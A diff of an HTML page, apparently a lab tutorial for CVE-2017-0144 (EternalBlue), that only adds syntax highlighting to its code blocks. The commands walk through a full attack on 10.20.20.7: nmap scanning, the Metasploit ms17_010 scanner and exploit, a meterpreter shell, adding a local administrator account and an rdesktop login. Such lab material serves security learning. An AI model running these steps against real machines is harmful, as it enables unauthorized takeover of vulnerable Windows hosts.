@@ -1,7 +1,7 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-<!-- 2023-02-02 Thu 21:55 -->
+<!-- 2023-02-15 Wed 22:04 -->
 <meta charset="utf-8" />
 <meta name="viewport" content="width=device-width, initial-scale=1" />
 <title>CVE-2017-0144</title>
@@ -72,8 +72,8 @@
 Bash
 </p>
 <div class="org-src-container">
-<pre class="src src-bash">nmap -r 10.20.20.0/28 # search target (optional)
-msfconsole
+<pre class="src src-bash"><span style="color: #006DAF;">nmap</span> <span style="color: #D0372D;">-r</span> 10.20.20.0/<span style="color: #D0372D;">28</span> <span style="color: #8D8D84; font-style: italic;"># search target (optional)</span>
+<span style="color: #006DAF;">msfconsole</span>
 </pre>
 </div></li>
 
@@ -81,12 +81,12 @@ msfconsole
 msfconsole
 </p>
 <div class="org-src-container">
-<pre class="src src-bash">search ms17_010
-use auxiliary/scanner/smb/smb_ms17_010
-set rhosts 10.20.20.7
-use exploit/windows/smb/ms17_010_eternalblue
-set rhosts 10.20.20.7
-run # exploit
+<pre class="src src-bash"><span style="color: #006DAF;">search</span> ms17_010
+<span style="color: #006DAF;">use</span> auxiliary/scanner/smb/smb_ms17_010
+<span style="color: #006FE0;">set</span> rhosts 10.20.20.7
+<span style="color: #006DAF;">use</span> exploit/windows/smb/ms17_010_eternalblue
+<span style="color: #006FE0;">set</span> rhosts 10.20.20.7
+<span style="color: #006DAF;">run</span> <span style="color: #8D8D84; font-style: italic;"># exploit</span>
 </pre>
 </div></li>
 
@@ -94,8 +94,8 @@ run # exploit
 meterpreter
 </p>
 <div class="org-src-container">
-<pre class="src src-bash">#if it not enter CMD automatically, input the below command in meterpreter
-shell
+<pre class="src src-bash"><span style="color: #8D8D84; font-style: italic;">#if it not enter CMD automatically, input the below command in meterpreter</span>
+<span style="color: #006DAF;">shell</span>
 </pre>
 </div></li>
 
@@ -113,9 +113,9 @@ net localgroup administrators USERNAME /add
 Bash
 </p>
 <div class="org-src-container">
-<pre class="src src-bash">rdesktop 10.20.20.7:3389
-# then input the USERNAME and PASSWORD you had created
-# now you can control the target machine
+<pre class="src src-bash"><span style="color: #006DAF;">rdesktop</span> 10.20.20.7:3389
+<span style="color: #8D8D84; font-style: italic;"># then input the USERNAME and PASSWORD you had created</span>
+<span style="color: #8D8D84; font-style: italic;"># now you can control the target machine</span>
 </pre>
 </div></li>
 </ol>
